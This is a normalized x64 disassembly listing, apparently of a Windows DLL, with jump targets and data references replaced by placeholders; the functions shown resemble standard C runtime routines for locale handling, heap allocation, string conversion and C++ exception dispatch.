je r-xdata
mov rax [ rsi + rdx * 8 + 0x27c ]
mov [ rsi + rdx * 8 + 0x27c ] rcx
inc rdx
inc r8d
mov rcx rax
cmp rdx 0x5
jl r-xdata
lea rcx [ rw-data ]
cmp [ rsp + 0x58 ] rcx
je r-xdata
mov rax [ rsp + 0x58 ]
mov rcx r13
mov [ rbx + rdi + 0x48 ] rax
call sub_180018b3c
mov r11d [ rsp + 0x54 ]
mov eax [ rsp + 0x50 ]
mov [ rdi + r14 * 4 ] r11d
mov [ rdi + 0x4 ] eax
jmp r-xdata
cmp r8d 0x5
jne r-xdata
movsxd rdx r8d
mov rax [ rsi + rdx * 8 + 0x27c ]
mov [ rsi + 0x27c ] rax
mov [ rsi + rdx * 8 + 0x27c ] rcx
mov eax [ rsi + rdx * 8 + 0x27c ]
cmp [ rdi + 0x4 ] eax
je r-xdata
jmp r-xdata
mov [ r13 ] 0x1
mov [ rbx + rdi + 0x58 ] r13
jmp r-xdata
mov rdx [ rbx + rdi + 0x58 ]
[ rdx ]
jne r-xdata
mov eax [ rsi + 0x280 ]
mov [ rdi + 0x108 ] eax
mov eax [ rdi + 0x14 ]
lea r12d [ r8 + 0x7a ]
mov [ rsp + 0x38 ] 0x1
mov [ rsp + 0x30 ] eax
mov eax [ rdi + 0x4 ]
lea r8 [ r--data ]
mov [ rsp + 0x28 ] eax
lea rax [ rbp ]
lea edx [ r12 - 0x7e ]
mov r9d r12d
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_180020bc0
test eax eax
je r-xdata
mov rcx [ rbx + rdi + 0x58 ]
call sub_180018b3c
shl r14 0x5
mov rcx [ r14 + rdi ]
call sub_180018b3c
and [ rbx + rdi + 0x50 ] 0x0
and [ rsi + 0x280 ] 0x0
lea rax [ rbp ]
mov ecx 0x1ff
and [ rax ] cx
add rax 0x2
dec r12
jne r-xdata
mov rdx [ rw-data ]
lea rcx [ rbp ]
mov r8d 0xfe
call sub_180023940
xor ecx ecx
test eax eax
sete cl
mov [ rsi + 0x280 ] ecx
jmp r-xdata
mov eax [ rdi + 0x4 ]
mov r9d r15d
mov [ rsi + 0x27c ] eax
sub_18001ae40
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0xd0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xc0 ] rax
mov rbx r8
mov rdi rcx
test edx edx
je r-xdata
xor esi esi
lea r12d [ rsi + 0x1 ]
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
call sub_18001a718
cmp [ r8 ] 0x4c
jne r-xdata
movsxd rax edx
shl rax 0x5
mov rax [ rax + rcx + 0x48 ]
jmp r-xdata
call sub_18001ab30
jmp r-xdata
and [ rsp + 0x28 ] esi
and [ rsp + 0x20 ] rsi
lea rdx [ rsp + 0x30 ]
xor r9d r9d
mov r8d 0x83
mov rcx rbx
call sub_18001a8f4
test rax rax
je r-xdata
cmp [ r8 + 0x1 ] 0x43
jne r-xdata
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_180018450
add rsp 0xd0
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
xor ebx ebx
lea rbp [ rdi + 0x48 ]
cmp [ r8 + 0x2 ] 0x5f
jne r-xdata
inc ebx
add rbp 0x20
cmp ebx 0x5
jle r-xdata
mov rdx [ rbp ]
lea rcx [ rsp + 0x30 ]
call sub_18001d6d0
test eax eax
je r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_180023ad8
mov rbp rax
test rax rax
je r-xdata
test ebx ebx
je r-xdata
test r12d r12d
jne r-xdata
inc esi
lea r8 [ rsp + 0x30 ]
mov edx ebx
mov rcx rdi
call sub_18001ab30
test rax rax
jne r-xdata
xor eax eax
jmp r-xdata
mov r13 rax
sub r13 rbx
je r-xdata
mov rcx rdi
jmp r-xdata
xor r12d r12d
jmp r-xdata
cmp [ rax ] 0x3b
je r-xdata
test esi esi
je r-xdata
mov r14d 0x1
lea r12 [ r--data ]
lea rax [ r--data ]
add r12 0x18
inc r14d
cmp r12 rax
jle r-xdata
mov rcx [ r12 ]
call sub_180019aa0
cmp r13 rax
je r-xdata
mov rcx [ r12 ]
mov r8 r13
mov rdx rbx
call sub_180023a20
test eax eax
jne r-xdata
inc rbp
lea rdx [ r--data ]
mov rcx rbp
call sub_180018c48
mov rbx rax
test rax rax
jne r-xdata
cmp r14d 0x5
jg r-xdata
cmp [ rbp ] 0x3b
jne r-xdata
add rbx rbp
cmp [ rbx ] 0x0
je r-xdata
lea rcx [ rsp + 0x30 ]
mov r9 rax
mov r8 rbp
mov edx 0x83
call sub_1800212a0
test eax eax
jne r-xdata
inc rbx
cmp [ rbx ] 0x0
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
lea r8 [ rsp + 0x30 ]
mov edx r14d
mov rcx rdi
mov [ rsp + rbx + 0x30 ] al
call sub_18001ab30
test rax rax
je r-xdata
inc esi
sub_18001b064
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov rsi rdx
mov ebp ecx
cmp ecx 0x5
ja r-xdata
xor eax eax
test rdx rdx
je r-xdata
mov r12d 0x1
mov edx r12d
lea ecx [ r12 + 0xf ]
call sub_18001b79c
mov rbx rax
test rax rax
jne r-xdata
mov rdx r12
mov ecx 0x160
call sub_18001b79c
mov [ rbx ] rax
test rax rax
jne r-xdata
call sub_1800194ec
mov [ rax ] 0xc
mov rdx r12
mov ecx 0x220
call sub_18001b79c
mov [ rbx + 0x8 ] rax
test rax rax
jne r-xdata
mov rcx rbx
call sub_180018b3c
jmp r-xdata
mov rdi [ rbx ]
test rdi rdi
je r-xdata
mov rcx [ rbx ]
call sub_180018b3c
jmp r-xdata
mov rcx [ rbx ]
mov r8 rsi
mov edx ebp
call sub_18001ae40
test rax rax
je r-xdata
lea rdx [ rw-data ]
cmp rdi rdx
je r-xdata
mov rcx [ rbx ]
call sub_18001dec0
mov rcx [ rbx ]
call sub_18001df64
mov rcx rbx
call sub_180018b3c
xor ebx ebx
jmp r-xdata
mov rax [ rbx ]
mov rdx [ rbx + 0x8 ]
mov ecx [ rax + 0x4 ]
call sub_18001e904
test eax eax
je r-xdata
mov rcx rdi
mov r8d 0x160
call sub_180018670
and [ rdi ] 0x0
mov rcx rdi
call sub_18001de34
mov rax rbx
jmp r-xdata
mov rax [ rbx + 0x8 ]
mov [ rax ] r12d
mov rax [ rbx + 0x8 ]
mov [ rax ] r12d
mov rcx [ rbx + 0x8 ]
call sub_180018b3c
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
sub_18001b19c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov r13 rdx
mov r12d ecx
xor esi esi
cmp ecx 0x5
jbe r-xdata
call sub_18001e320
mov rbx rax
mov [ rsp + 0x60 ] rax
call sub_18001e138
or [ rbx + 0xc8 ] 0x10
mov edx 0x1
mov ecx 0x160
call sub_18001b79c
mov rdi rax
test rax rax
je r-xdata
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
xor eax eax
jmp r-xdata
and [ rbx + 0xc8 ] 0xffffffef
mov rax rsi
mov ecx 0xc
call sub_180022e38
nop
mov rdx [ rbx + 0xc0 ]
test rdx rdx
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
mov ecx 0xc
call sub_180022d38
mov r8 r13
mov edx r12d
mov rcx rdi
call sub_18001ae40
mov rsi rax
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
cmp rdi rdx
je r-xdata
mov rcx rdi
call sub_18001dec0
mov rcx rdi
call sub_18001df64
nop
test r13 r13
je r-xdata
mov rcx rdi
mov r8d 0x160
call sub_180018670
and [ rdi ] 0x0
mov rcx rdi
call sub_18001de34
nop
mov r12d 0x1
lea rdx [ rw-data ]
mov rcx r13
call sub_18001d6d0
mov ecx [ rw-data ]
test eax eax
mov r12d 0x1
cmovne ecx r12d
mov [ rw-data ] ecx
jmp r-xdata
mov ecx 0xc
call sub_180022d38
jmp r-xdata
test [ rw-data ] r12b
jne r-xdata
mov ecx 0xc
call sub_180022e38
nop
mov rdx rdi
lea rcx [ rbx + 0xc0 ]
call sub_18001e0e0
mov rcx rdi
call sub_18001dec0
test [ rbx + 0xc8 ] 0x2
jne r-xdata
mov rdx [ rbx + 0xc0 ]
lea rcx [ rw-data ]
call sub_18001e0e0
mov r11 [ rw-data ]
mov rax [ r11 + 0x128 ]
mov [ rw-data ] rax
mov rax [ r11 + 0x140 ]
mov [ rw-data ] rax
mov eax [ r11 + 0x10c ]
mov [ rw-data ] eax
sub_18001b358
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
cmp rcx 0xffffffffffffffe0
ja r-xdata
call sub_18001d788
call sub_1800194ec
mov [ rax ] 0xc
xor eax eax
mov edi 0x1
test rcx rcx
cmovne rdi rcx
mov r8 rdi
xor edx edx
call [ HeapAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
call sub_1800210b0
mov ecx 0x1e
call sub_180020e50
mov ecx 0xff
call sub_18001fbbc
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call sub_1800194ec
mov [ rax ] 0xc
mov rcx rbx
call sub_18001d788
test eax eax
je r-xdata
call sub_1800194ec
mov [ rax ] 0xc
jmp r-xdata
mov rcx [ rw-data ]
test rcx rcx
jne r-xdata
sub_18001b410
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
movsxd rax r9d
mov rbx r8
mov edi edx
mov esi ecx
test r9d r9d
jle r-xdata
mov r9d [ rsp + 0x68 ]
mov rdx [ rsp + 0x60 ]
mov r8 rbx
mov [ rsp + 0x28 ] r9d
mov [ rsp + 0x20 ] rdx
mov edx edi
mov r9d eax
mov ecx esi
call [ LCMapStringW@IAT ]
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov rdx rax
mov rcx rbx
call sub_180023b74
sub_18001b470
push rbx
sub rsp 0x20
mov r11d [ r8 ]
mov rbx rdx
mov r9 rcx
and r11d 0xfffffff8
test [ r8 ] 0x4
mov r10 rcx
je r-xdata
movsxd rax r11d
mov rdx [ rax + r10 ]
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0x8 ]
add rcx [ rbx + 0x8 ]
test [ rcx + 0x3 ] 0xf
je r-xdata
mov eax [ r8 + 0x8 ]
movsxd r10 [ r8 + 0x4 ]
neg eax
add r10 rcx
movsxd rcx eax
and r10 rcx
xor r9 rdx
mov rcx r9
add rsp 0x20
pop rbx
jmp sub_180018450
movzx eax [ rcx + 0x3 ]
and eax 0xfffffff0
cdqe
add r9 rax
sub_18001b4f4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov esi r9d
mov r11 r8
mov r10 rdx
mov edi ecx
test rdx rdx
jne r-xdata
test r8 r8
je r-xdata
call sub_1800194ec
mov ebx 0x16
mov [ rdx ] 0x0
mov edx [ rsp + 0x50 ]
mov eax edx
neg eax
sbb rcx rcx
neg rcx
inc rcx
cmp r8 rcx
ja r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea eax [ r9 - 0x2 ]
mov ebx 0x22
cmp eax ebx
ja r-xdata
call sub_1800194ec
mov ebx 0x22
jmp r-xdata
xor ecx ecx
mov r8 r10
test edx edx
je r-xdata
mov [ rax ] ebx
call sub_18001dab4
mov eax ebx
jmp r-xdata
mov r9 r8
mov [ r10 ] 0x2d
lea r8 [ r10 + 0x1 ]
lea ecx [ rbx - 0x21 ]
neg edi
add dl 0x30
add dl 0x57
jmp r-xdata
cmp rcx r11
jb r-xdata
cmp rcx r11
jb r-xdata
mov [ r8 ] dl
inc rcx
inc r8
test eax eax
je r-xdata
mov [ r8 ] 0x0
dec r8
mov [ r10 ] 0x0
call sub_1800194ec
jmp r-xdata
xor edx edx
mov eax edi
div esi
mov edi eax
cmp edx 0x9
jbe r-xdata
mov al [ r9 ]
mov cl [ r8 ]
mov [ r8 ] al
mov [ r9 ] cl
inc r9
dec r8
cmp r9 r8
jb r-xdata
xor eax eax
sub_18001b610
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov esi r9d
mov r11 r8
mov r10 rdx
mov rdi rcx
test rdx rdx
jne r-xdata
test r8 r8
je r-xdata
call sub_1800194ec
mov ebx 0x16
mov [ rdx ] 0x0
mov edx [ rsp + 0x50 ]
mov eax edx
neg eax
sbb rcx rcx
neg rcx
inc rcx
cmp r8 rcx
ja r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea eax [ rsi - 0x2 ]
mov ebx 0x22
cmp eax ebx
ja r-xdata
call sub_1800194ec
mov ebx 0x22
jmp r-xdata
xor ecx ecx
mov r8 r10
test edx edx
je r-xdata
mov [ rax ] ebx
call sub_18001dab4
mov eax ebx
jmp r-xdata
mov r9 r8
mov [ r10 ] 0x2d
lea r8 [ r10 + 0x1 ]
lea ecx [ rbx - 0x21 ]
neg rdi
add dl 0x30
add dl 0x57
jmp r-xdata
cmp rcx r11
jb r-xdata
cmp rcx r11
jb r-xdata
mov [ r8 ] dl
inc rcx
inc r8
test rax rax
je r-xdata
mov [ r8 ] 0x0
dec r8
mov [ r10 ] 0x0
call sub_1800194ec
jmp r-xdata
xor edx edx
mov rax rdi
div rsi
mov rdi rax
cmp edx 0x9
jbe r-xdata
mov al [ r9 ]
mov cl [ r8 ]
mov [ r8 ] al
mov [ r9 ] cl
inc r9
dec r8
cmp r9 r8
jb r-xdata
xor eax eax
sub_18001b71c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov edi [ rw-data ]
xor ebp ebp
mov rsi rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test edi edi
je r-xdata
mov ecx ebp
call [ Sleep@IAT ]
mov edi [ rw-data ]
lea r11d [ rbp + 0x3e8 ]
cmp r11d edi
mov ebp r11d
cmova ebp r12d
cmp ebp r12d
jne r-xdata
mov rcx rsi
call sub_18001b358
mov rbx rax
test rax rax
jne r-xdata
sub_18001b79c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor edi edi
mov rsi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
cmp [ rw-data ] eax
jbe r-xdata
mov ecx edi
call [ Sleep@IAT ]
lea r11d [ rdi + 0x3e8 ]
cmp r11d [ rw-data ]
mov edi r11d
cmova edi r12d
cmp edi r12d
jne r-xdata
xor r8d r8d
mov rdx rsi
mov rcx rbp
call sub_180023b94
mov rbx rax
test rax rax
jne r-xdata
sub_18001b820
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor esi esi
mov rdi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test rdi rdi
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
mov ecx esi
call [ Sleep@IAT ]
lea r11d [ rsi + 0x3e8 ]
cmp r11d [ rw-data ]
mov esi r11d
cmova esi r12d
cmp esi r12d
jne r-xdata
mov rdx rdi
mov rcx rbp
call sub_180023c30
mov rbx rax
test rax rax
jne r-xdata
sub_18001b8a8
sub rsp 0x28
call sub_18001e320
mov rcx [ rax + 0xc0 ]
cmp rcx [ rw-data ]
je r-xdata
mov rax [ rcx + 0x140 ]
add rsp 0x28
retn
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18001e138
mov rcx rax
sub_18001b8e4
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x50
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x8 ] rax
mov ebx [ rbp + 0x60 ]
xor edi edi
mov r14 r9
mov r15d r8d
mov [ rbp ] edx
test ebx ebx
jle r-xdata
mov r12d [ rbp + 0x78 ]
mov esi edi
test r12d r12d
jne r-xdata
mov r10d ebx
mov rax r9
neg [ rbp + 0x80 ]
mov r9d ebx
mov r8 r14
sbb edx edx
mov ecx r12d
mov [ rsp + 0x28 ] edi
and edx 0x8
mov [ rsp + 0x20 ] rdi
inc edx
call [ MultiByteToWideChar@IAT ]
movsxd r13 eax
test eax eax
jne r-xdata
mov rax [ rcx ]
mov r12d [ rax + 0x4 ]
mov eax ebx
sub eax r10d
dec eax
cmp eax ebx
lea ebx [ rax + 0x1 ]
jl r-xdata
inc rax
test r10d r10d
jne r-xdata
mov r8 0xffffffffffffff0
test eax eax
jle r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
dec r10d
cmp [ rax ] dil
je r-xdata
or r10d 0xffffffff
test rdi rdi
je r-xdata
xor edx edx
lea rax [ rdx - 0x20 ]
div r13
cmp rax 0x2
jb r-xdata
mov rcx [ rbp + 0x8 ]
xor rcx rbp
call sub_180018450
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r9d ebx
mov r8 r14
mov edx 0x1
mov ecx r12d
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r13 + r13 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r14d [ rbp ]
and [ rsp + 0x28 ] esi
and [ rsp + 0x20 ] rsi
mov ecx r14d
mov r9d r13d
mov r8 rdi
mov edx r15d
call [ LCMapStringW@IAT ]
movsxd rsi eax
test eax eax
je r-xdata
call sub_18001b358
mov rdi rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax esi
call sub_180018b3c
mov r8d 0x400
test r8d r15d
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180023d20
sub rsp rax
lea rdi [ rsp + 0x40 ]
test rdi rdi
je r-xdata
mov rax r8
test eax eax
jle r-xdata
mov ecx [ rbp + 0x70 ]
test ecx ecx
je r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
xor ebx ebx
xor edx edx
lea rax [ rdx - 0x20 ]
div rsi
cmp rax 0x2
jb r-xdata
cmp esi ecx
jg r-xdata
add rdi 0x10
mov r9d r13d
mov r8 rdi
mov edx r15d
mov ecx r14d
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call [ LCMapStringW@IAT ]
xor ecx ecx
test eax eax
je r-xdata
lea rcx [ rsi + rsi + 0x10 ]
cmp rcx r8
ja r-xdata
mov rax [ rbp + 0x68 ]
mov [ rsp + 0x28 ] ecx
mov r9d r13d
mov r8 rdi
mov edx r15d
mov ecx r14d
mov [ rsp + 0x20 ] rax
call [ LCMapStringW@IAT ]
jmp r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov eax [ rbp + 0x70 ]
xor edx edx
mov [ rsp + 0x38 ] rcx
mov r9d esi
mov r8 rbx
mov [ rsp + 0x30 ] rcx
test eax eax
jne r-xdata
call sub_18001b358
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
call sub_180018b3c
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x68 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x20 ] rcx
jmp r-xdata
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180023d20
sub rsp rax
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
mov ecx r12d
call [ WideCharToMultiByte@IAT ]
mov esi eax
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_18001bbb0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x70
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x50 ]
mov rbx r9
mov edi r8d
call sub_180018cdc
mov eax [ rsp + 0xb8 ]
mov r11d [ rsp + 0xc0 ]
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] r11d
mov [ rsp + 0x38 ] eax
mov eax [ rsp + 0xb0 ]
mov [ rsp + 0x30 ] eax
mov rax [ rsp + 0xa8 ]
mov r9 rbx
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0xa0 ]
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] eax
call sub_18001b8e4
cmp [ rsp + 0x68 ] 0x0
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
mov rcx [ rsp + 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18001bc48
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_180018cdc
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x4
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x4
lea r8 [ rsp + 0x20 ]
mov edx 0x4
mov ecx ebx
call sub_180023d70
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_18001bcc8
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_180018cdc
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x8
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x8
lea r8 [ rsp + 0x20 ]
mov edx 0x8
mov ecx ebx
call sub_180023d70
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_18001bd58
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_1800185c4
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180018b3c
sub_18001bd94
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov esi [ rcx + 0x4 ]
xor ebx ebx
mov r12 r8
mov rbp rdx
mov rdi rcx
test esi esi
je r-xdata
mov r11 rbx
movsxd rsi esi
call sub_180019c34
lea r11 [ rsi + rax ]
jmp r-xdata
mov eax 0x1
test esi esi
je r-xdata
test r11 r11
je r-xdata
mov r11 rbx
movsxd rsi [ rdi + 0x4 ]
call sub_180019c34
lea r11 [ rsi + rax ]
jmp r-xdata
test esi esi
je r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
mov rsi rbx
call sub_180019c34
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
mov al 0x2
test [ rbp ] al
je r-xdata
cmp [ rdi + 0x4 ] ebx
je r-xdata
call sub_180019c4c
mov r11 rax
movsxd rax [ rbp + 0x4 ]
add r11 rax
cmp rsi r11
je r-xdata
test [ r12 ] 0x1
je r-xdata
test [ rdi ] 0x8
je r-xdata
mov rsi rbx
call sub_180019c34
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
test [ r12 ] 0x4
je r-xdata
test [ rdi ] 0x1
je r-xdata
mov eax ebx
jmp r-xdata
xor eax eax
jmp r-xdata
call sub_180019c4c
lea rcx [ rsi + 0x10 ]
mov r11 rax
movsxd rax [ rbp + 0x4 ]
lea rdx [ r11 + rax + 0x10 ]
call sub_18001d6d0
test eax eax
je r-xdata
test [ r12 ] al
je r-xdata
test [ rdi ] 0x4
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov ebx 0x1
test [ rdi ] al
je r-xdata
sub_18001beb8
sub rsp 0x28
mov rax [ rcx ]
cmp [ rax ] 0xe0434352
je r-xdata
call sub_18001e320
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp [ rax ] 0xe0434f4d
je r-xdata
xor eax eax
add rsp 0x28
retn
call sub_18001e320
dec [ rax + 0x100 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
call sub_18001e320
and [ rax + 0x100 ] 0x0
call sub_180021224
sub_18001bf0c
mov rax rsp
mov [ rax + 0x20 ] r9d
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r13d r9d
mov rsi r8
mov r15 rdx
mov r14 rcx
call sub_180021188
mov edi eax
call sub_180019c34
mov [ rsp + 0x28 ] rax
call sub_18001e320
inc [ rax + 0x100 ]
call sub_18001e320
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp edi r13d
jle r-xdata
cmp edi 0xffffffff
je r-xdata
call sub_18001e320
dec [ rax + 0x100 ]
cmp edi 0xffffffff
jle r-xdata
mov r9d edi
mov r8 rsi
mov rdx r15
mov rcx r14
call sub_1800211b0
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp edi r13d
jle r-xdata
call sub_180021248
cmp edi [ rsi + 0x4 ]
jl r-xdata
call sub_180021248
movsxd r12 edi
call sub_180019c34
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
mov edi [ rcx + rax ]
mov [ rsp + 0x20 ] edi
call sub_180019c34
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_180019c34
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_180019c34
add rax rbx
jmp r-xdata
jmp r-xdata
mov r9d edi
mov r8 rsi
mov rdx r15
mov rcx r14
call sub_1800211b0
call sub_180019c34
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov [ rsp + 0x24 ] edi
jmp r-xdata
xor eax eax
call sub_180019c34
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_180019c34
add rax rbx
jmp r-xdata
cmp edi 0xffffffff
je r-xdata
mov r8d 0x103
mov rdx r14
mov rcx rax
call sub_180023e70
mov rcx [ rsp + 0x28 ]
call sub_180019c64
sub_18001c098
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] dl
sub rsp 0x28
cmp [ rcx ] 0xe06d7363
jne r-xdata
add rsp 0x28
mov rax [ rcx + 0x30 ]
test rax rax
je r-xdata
cmp [ rax + 0x4 ] 0x0
je r-xdata
movsxd rax [ rax + 0x4 ]
mov rdx [ rcx + 0x38 ]
add rdx rax
mov rcx [ rcx + 0x28 ]
call rdx
jmp r-xdata
sub_18001c11c
